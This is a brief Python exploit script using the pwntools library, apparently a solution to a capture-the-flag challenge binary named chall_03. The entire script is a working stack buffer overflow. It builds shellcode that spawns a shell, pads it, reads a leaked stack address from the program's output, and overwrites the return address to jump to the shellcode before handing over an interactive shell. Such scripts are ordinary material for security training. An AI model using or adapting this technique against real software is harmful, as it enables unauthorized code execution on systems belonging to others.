from pwn import *
import re
context.arch = "amd64"
payload = asm(shellcraft.sh())
payload += b"A"*(328 - len(payload))
p=process('./chall_03')
resp = p.recv()
leak_as_int = int(re.findall(b"(0x[0-9a-f]{6,16})", resp)[0], 16)
payload += p64(leak_as_int)
p.sendline(payload)
p.interactive()
